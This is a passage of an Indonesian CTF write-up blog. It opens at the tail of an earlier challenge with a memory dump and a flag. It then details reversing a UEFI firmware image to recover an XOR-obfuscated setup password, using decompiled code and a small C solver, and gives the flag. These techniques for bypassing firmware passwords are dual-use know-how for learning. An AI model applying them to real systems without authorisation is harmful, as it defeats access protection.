</span></span><span style=display:flex><span>0x58f060: <span style=color:#e0af68>41414141</span> <span style=color:#e0af68>41414141</span> <span style=color:#e0af68>41414141</span> <span style=color:#e0af68>41414141</span> 07febfd9 <span style=color:#e0af68>00000010</span> <span style=color:#e0af68>00000046</span> 0053e7f4
</span></span></code></pre></div><p>Flag: <code>wreck{m4Yb3_w3_Shl0ud_T4lk_brO}</code></p><p>Sedikit cerita, <code>checkm8</code> ini adalah bootrom exploit yang baru saja keluar untuk apples SoC yang menggunakan UaF bug pada bagian usb. Saya sempat &ldquo;tersasar&rdquo; beberapa saat dalam mengerjakan ini untuk mencari tahu internal mm (memory management) untuk coreboot dahulu karena mungkin saja, <code>checkm8</code> di soal ini juga memerlukan uaf. F.</p><h1 id=sehnsucht>Sehnsucht</h1><blockquote><p>Bambang merasa galau karena dia lupa password UEFI servernya yang berada di Antartika. Bantu bambang menyelesaikan permasalahan berat hidupnya ini. Terima Kasih.</p><p>Note: Saya solve soal ini setelah lomba berakhir</p></blockquote><p>Dari hint dan deskripsi soal dapat diketahui file yang diberikan adalah firmware UEFI, mengingat beberapa bulan lalu ada soal yang sama juga mengenai UEFI di Google CTF Quals, saya menggunakan writeup <a href=https://github.com/EmpireCTF/empirectf/tree/master/writeups/2019-06-22-Google-CTF-Quals#271-Pwn--SecureBoot>Google CTF Quals - SecureBoot</a> untuk <em>kickstart</em> awal reversing.</p><p>Buka file dengan <code>uefitool</code> dan extract body dari <code>UiApp</code>, <img src=wreckit-sehnsucht-uefitool.png alt=uiapp></p><p>Lanjut ke analisa file hasil extract tadi (<code>uiapp.dll</code>), mencoba strings dengan beberapa encoding tidak memberikan hasil apa-apa saat mencari untuk string &ldquo;Password&rdquo;.</p><p>Sesuai dengan referensi writeup yang ditulis di atas untuk mempermudah reversing, fix type data (shortcut key: y) variable global yang diinisialisasi pada <code>ModuleEntryPoint(EFI_HANDLE *ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</code>. berikut hasilnya (Ini terletak pada bagian awal fungsi tersebut),</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>EFIHandle <span style=color:#9ece6a;font-weight:700>=</span> (EFI_HANDLE <span style=color:#9ece6a;font-weight:700>*</span>)ImageHandle;
</span></span><span style=display:flex><span>v2 <span style=color:#9ece6a;font-weight:700>=</span> SystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>RuntimeServices;
</span></span><span style=display:flex><span>EFISystemTable <span style=color:#9ece6a;font-weight:700>=</span> SystemTable;
</span></span><span style=display:flex><span>v3 <span style=color:#9ece6a;font-weight:700>=</span> SystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>BootServices;
</span></span><span style=display:flex><span>EFIRuntimeServices <span style=color:#9ece6a;font-weight:700>=</span> v2;
</span></span><span style=display:flex><span>EFIBootServices <span style=color:#9ece6a;font-weight:700>=</span> v3;
</span></span></code></pre></div><p>Selanjutnya saya mencari fungsi mana yang melakukan print string Password satu per satu, bagian ini ditemukan pada <code>sub_240()</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConOut<span style=color:#9ece6a;font-weight:700>-&gt;</span><span style=color:#7aa2f7>ClearScreen</span>(EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConOut);
</span></span><span style=display:flex><span>v124 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>maybe_alloc_8926</span>(<span style=color:#e0af68>800</span>);
</span></span><span style=display:flex><span>v118 <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#bb9af7>__int16</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>maybe_alloc_8926</span>(<span style=color:#e0af68>800</span>);
</span></span><span style=display:flex><span>v1 <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#bb9af7>__int16</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>maybe_alloc_8926</span>(<span style=color:#e0af68>800</span>);
</span></span><span style=display:flex><span><span style=color:#bb9af7>do</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  v24 <span style=color:#9ece6a;font-weight:700>=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span>;
</span></span><span style=display:flex><span>  v118[v0] <span style=color:#9ece6a;font-weight:700>=</span> word_1172C[v0] <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>5</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>do</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v25 <span style=color:#9ece6a;font-weight:700>=</span> word_11744[v24];
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>if</span> ( v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span> <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>2</span> )
</span></span><span style=display:flex><span>        <span style=color:#7aa2f7>LOBYTE</span>(v25) <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xC1</span>;
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>        <span style=color:#7aa2f7>LOBYTE</span>(v25) <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xAB</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v25 <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x53u</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v1[v24] <span style=color:#9ece6a;font-weight:700>=</span> v25;
</span></span><span style=display:flex><span>    v1[v24] <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x12u</span>;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>++</span>v24;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> ( v24 <span style=color:#9ece6a;font-weight:700>!=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>2</span> );
</span></span><span style=display:flex><span>  <span style=color:#9ece6a;font-weight:700>++</span>v0;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#bb9af7>while</span> ( v0 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>11</span> );
</span></span><span style=display:flex><span>v26 <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>int</span>)<span style=color:#9ece6a;font-weight:700>&amp;</span>input_from_readkeystroke_v151;
</span></span><span style=display:flex><span><span style=color:#7aa2f7>maybe_printf_8CA8</span>((<span style=color:#bb9af7>const</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#9d7cd8>L</span><span style=color:#9ece6a>&#34;%s&#34;</span>, v118);
</span></span><span style=display:flex><span><span style=color:#7aa2f7>sub_8739</span>();
</span></span><span style=display:flex><span>v28 <span style=color:#9ece6a;font-weight:700>=</span> v124;
</span></span><span style=display:flex><span><span style=color:#bb9af7>do</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> ( ((<span style=color:#41a6b5>int</span> (<span style=color:#bb9af7>__cdecl</span> <span style=color:#9ece6a;font-weight:700>*</span>)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL <span style=color:#9ece6a;font-weight:700>*</span>, <span style=color:#41a6b5>int</span> <span style=color:#9ece6a;font-weight:700>*</span>, <span style=color:#41a6b5>int</span>, <span style=color:#41a6b5>int</span>))EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConIn<span style=color:#9ece6a;font-weight:700>-&gt;</span>ReadKeyStroke)(
</span></span><span style=display:flex><span>            EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConIn,
</span></span><span style=display:flex><span>            <span style=color:#9ece6a;font-weight:700>&amp;</span>input_from_readkeystroke_v151,
</span></span><span style=display:flex><span>            v27,
</span></span><span style=display:flex><span>            v27) )
</span></span><span style=display:flex><span>    ;
</span></span><span style=display:flex><span>  v28 <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#e0af68>2</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a;font-weight:700>*</span>(_WORD <span style=color:#9ece6a;font-weight:700>*</span>)(v28 <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>2</span>) <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>HIWORD</span>(input_from_readkeystroke_v151) <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0x12</span>;
</span></span><span style=display:flex><span>  ((<span style=color:#41a6b5>void</span> (<span style=color:#bb9af7>__cdecl</span> <span style=color:#9ece6a;font-weight:700>*</span>)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL <span style=color:#9ece6a;font-weight:700>*</span>, <span style=color:#bb9af7>__int16</span> <span style=color:#9ece6a;font-weight:700>*</span>, <span style=color:#41a6b5>int</span>, <span style=color:#41a6b5>int</span>))EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConOut<span style=color:#9ece6a;font-weight:700>-&gt;</span>OutputString)(
</span></span><span style=display:flex><span>    EFISystemTable<span style=color:#9ece6a;font-weight:700>-&gt;</span>ConOut,
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>&amp;</span>str_bintang,                             <span style=color:#414868;font-style:italic>// &#34;*&#34;
</span></span></span><span style=display:flex><span>    v29,
</span></span><span style=display:flex><span>    v29);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#bb9af7>while</span> ( <span style=color:#7aa2f7>HIWORD</span>(v151) <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>13</span> );
</span></span></code></pre></div><p>Kalau diteliti lagi bagian ini sebenarnya melakukan,</p><pre><code>1. clear screen
2. `printf(&quot;%s&quot;, v118)`, v118 ini bisa jadi string password
3. `ReadKeyStroke(..., &amp;v151, ...` dan menyimpannya ke `v124 + off = v151`, `v124` ini bisa jadi input password
4. setelah input tadi, yang print hanya &quot;*&quot; (simbol bintang)
</code></pre><p>dan ini pas banget untuk apa yang dilakukan saat menjalakan filenya dengan qemu setelah memberi input exit pada UEFI shell.</p><p>Untuk membuktikan asumsi tadi, coba buat bagian tadi ke C,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>char</span> word_1172C[] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>85</span>, <span style=color:#e0af68>100</span>, <span style=color:#e0af68>118</span>, <span style=color:#e0af68>118</span>, <span style=color:#e0af68>114</span>, <span style=color:#e0af68>106</span>, <span style=color:#e0af68>119</span>, <span style=color:#e0af68>97</span>, <span style=color:#e0af68>37</span>, <span style=color:#e0af68>63</span>, <span style=color:#e0af68>37</span>, <span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span><span style=color:#41a6b5>char</span> word_11744[] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>3</span>,  <span style=color:#e0af68>235</span>, <span style=color:#e0af68>244</span>, <span style=color:#e0af68>102</span>, <span style=color:#e0af68>223</span>, <span style=color:#e0af68>174</span>, <span style=color:#e0af68>36</span>, <span style=color:#e0af68>217</span>, <span style=color:#e0af68>242</span>, <span style=color:#e0af68>48</span>, <span style=color:#e0af68>224</span>, <span style=color:#e0af68>240</span>,
</span></span><span style=display:flex><span>                     <span style=color:#e0af68>39</span>, <span style=color:#e0af68>235</span>, <span style=color:#e0af68>178</span>, <span style=color:#e0af68>96</span>,  <span style=color:#e0af68>200</span>, <span style=color:#e0af68>173</span>, <span style=color:#e0af68>50</span>, <span style=color:#e0af68>201</span>, <span style=color:#e0af68>240</span>, <span style=color:#e0af68>23</span>, <span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#bb9af7>const</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v1[<span style=color:#e0af68>100</span>] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v118[<span style=color:#e0af68>100</span>] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v0 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>do</span> {
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> v24 <span style=color:#9ece6a;font-weight:700>=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span>;
</span></span><span style=display:flex><span>    v118[v0] <span style=color:#9ece6a;font-weight:700>=</span> word_1172C[v0] <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>5</span>;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>do</span> {
</span></span><span style=display:flex><span>      <span style=color:#41a6b5>char</span> v25 <span style=color:#9ece6a;font-weight:700>=</span> word_11744[v24];
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>if</span> (v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span>) {
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> (v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span> <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>2</span>)
</span></span><span style=display:flex><span>          v25 <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xC1</span>;
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>          v25 <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xAB</span>;
</span></span><span style=display:flex><span>      } <span style=color:#bb9af7>else</span> {
</span></span><span style=display:flex><span>        v25 <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x53u</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      v1[v24] <span style=color:#9ece6a;font-weight:700>=</span> v25;
</span></span><span style=display:flex><span>      v1[v24<span style=color:#9ece6a;font-weight:700>++</span>] <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x12u</span>;
</span></span><span style=display:flex><span>    } <span style=color:#bb9af7>while</span> (v24 <span style=color:#9ece6a;font-weight:700>!=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>2</span>);
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>++</span>v0;
</span></span><span style=display:flex><span>  } <span style=color:#bb9af7>while</span> (v0 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>11</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;%s&#34;</span>, v118);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>compile lalau jalankan programnya,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ gcc solve.c -o solve
</span></span><span style=display:flex><span>$ ./solve
</span></span><span style=display:flex><span>Password :
</span></span></code></pre></div><p>Yep, asumsi awal kita benar dengan begitu, <code>v124</code> ini adalah input dari password. Cari xref nya untuk mendapatkan dimana input dicek,</p><p><img src=wreckit-sehnsucht-v124xref.png alt="v124 xref"></p><p>basic block <code>if</code> ini sebenarnya sudah menandakan tanda bagus kalau <code>v124</code> sedang dicek terhadap variabel lain, plus fungsi <code>sub_902A</code> ini sebenarnya <code>strncmp</code>, berikuta hasil dekompilasinya,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#bb9af7>__cdecl</span> <span style=color:#7aa2f7>sub_902A</span>(<span style=color:#41a6b5>unsigned</span> <span style=color:#bb9af7>__int16</span> <span style=color:#9ece6a;font-weight:700>*</span>a1, _WORD <span style=color:#9ece6a;font-weight:700>*</span>a2, <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#bb9af7>__int16</span> <span style=color:#9ece6a;font-weight:700>*</span>v3; <span style=color:#414868;font-style:italic>// edi
</span></span></span><span style=display:flex><span>  _WORD <span style=color:#9ece6a;font-weight:700>*</span>v4; <span style=color:#414868;font-style:italic>// edx
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> i; <span style=color:#414868;font-style:italic>// esi
</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v6; <span style=color:#414868;font-style:italic>// eax
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  v3 <span style=color:#9ece6a;font-weight:700>=</span> a1;
</span></span><span style=display:flex><span>  v4 <span style=color:#9ece6a;font-weight:700>=</span> a2;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> ( i <span style=color:#9ece6a;font-weight:700>=</span> a3; ; <span style=color:#9ece6a;font-weight:700>--</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v6 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a;font-weight:700>*</span>v3;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( <span style=color:#9ece6a;font-weight:700>!</span>(_WORD)v6 <span style=color:#9ece6a;font-weight:700>||</span> <span style=color:#9ece6a;font-weight:700>*</span>v4 <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>0</span> <span style=color:#9ece6a;font-weight:700>||</span> (_WORD)v6 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#9ece6a;font-weight:700>*</span>v4 <span style=color:#9ece6a;font-weight:700>||</span> i <span style=color:#9ece6a;font-weight:700>&lt;=</span> <span style=color:#e0af68>1</span> )
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>++</span>v3;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>++</span>v4;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> v6 <span style=color:#9ece6a;font-weight:700>-</span> (<span style=color:#41a6b5>unsigned</span> <span style=color:#bb9af7>__int16</span>)<span style=color:#9ece6a;font-weight:700>*</span>v4;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>dengan begitu, <code>sub_902A(v124, v1, 0x16u)</code> adalah <code>strncmp(v124, v1, 0x16u)</code>. Kalau lihat lagi ke hasil dekompilasi IDA atau pada <code>solve.c</code>, <code>v1</code> ini diinisialisasi berbarengan dengan string password (<code>v118</code>) dan input dixor dengan 0x12 (<code>*(_WORD *)(v28 - 2) = HIWORD(input_from_readkeystroke_v151) ^ 0x12;</code>),</p><p>Jadi, sekarang hanya perlu mengubah <code>solve.c</code> tadi untuk print <code>v1</code> tanpa dixor dengan 0x12 pada akhirnya. Berikut hasilnya,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#414868;font-style:italic>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>short</span> word_1172C[] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>85</span>, <span style=color:#e0af68>100</span>, <span style=color:#e0af68>118</span>, <span style=color:#e0af68>118</span>, <span style=color:#e0af68>114</span>, <span style=color:#e0af68>106</span>, <span style=color:#e0af68>119</span>, <span style=color:#e0af68>97</span>, <span style=color:#e0af68>37</span>, <span style=color:#e0af68>63</span>, <span style=color:#e0af68>37</span>, <span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span><span style=color:#41a6b5>char</span> word_11744[] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>3</span>,  <span style=color:#e0af68>235</span>, <span style=color:#e0af68>244</span>, <span style=color:#e0af68>102</span>, <span style=color:#e0af68>223</span>, <span style=color:#e0af68>174</span>, <span style=color:#e0af68>36</span>, <span style=color:#e0af68>217</span>, <span style=color:#e0af68>242</span>, <span style=color:#e0af68>48</span>, <span style=color:#e0af68>224</span>, <span style=color:#e0af68>240</span>,
</span></span><span style=display:flex><span>                     <span style=color:#e0af68>39</span>, <span style=color:#e0af68>235</span>, <span style=color:#e0af68>178</span>, <span style=color:#e0af68>96</span>,  <span style=color:#e0af68>200</span>, <span style=color:#e0af68>173</span>, <span style=color:#e0af68>50</span>, <span style=color:#e0af68>201</span>, <span style=color:#e0af68>240</span>, <span style=color:#e0af68>23</span>, <span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#bb9af7>const</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v1[<span style=color:#e0af68>100</span>] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> v118[<span style=color:#e0af68>100</span>] <span style=color:#9ece6a;font-weight:700>=</span> {<span style=color:#e0af68>0</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> v0 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>do</span> {
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> v24 <span style=color:#9ece6a;font-weight:700>=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span>;
</span></span><span style=display:flex><span>    v118[v0] <span style=color:#9ece6a;font-weight:700>=</span> word_1172C[v0] <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>5</span>;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>do</span> {
</span></span><span style=display:flex><span>      <span style=color:#41a6b5>char</span> v25 <span style=color:#9ece6a;font-weight:700>=</span> word_11744[v24];
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>if</span> (v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span>) {
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>if</span> (v24 <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>3</span> <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>2</span>)
</span></span><span style=display:flex><span>          v25 <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xC1</span>;
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>else</span>
</span></span><span style=display:flex><span>          v25 <span style=color:#9ece6a;font-weight:700>=</span> v25 <span style=color:#9ece6a;font-weight:700>^</span> <span style=color:#e0af68>0xAB</span>;
</span></span><span style=display:flex><span>      } <span style=color:#bb9af7>else</span> {
</span></span><span style=display:flex><span>        v25 <span style=color:#9ece6a;font-weight:700>^=</span> <span style=color:#e0af68>0x53u</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      v1[v24<span style=color:#9ece6a;font-weight:700>++</span>] <span style=color:#9ece6a;font-weight:700>=</span> v25;
</span></span><span style=display:flex><span>      <span style=color:#414868;font-style:italic>// v1[v24++] ^= 0x12u;
</span></span></span><span style=display:flex><span>    } <span style=color:#bb9af7>while</span> (v24 <span style=color:#9ece6a;font-weight:700>!=</span> v0 <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>2</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>2</span>);
</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>++</span>v0;
</span></span><span style=display:flex><span>  } <span style=color:#bb9af7>while</span> (v0 <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#e0af68>11</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;%s&#34;</span>, v1);
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><img src=wreckit-sehnsucht-solve.png alt=solve></p><p>Flag: <code>wreck{Ea5y_U3f1_t34s3_4_Qua15s}</code></p><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/rev/>Rev</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>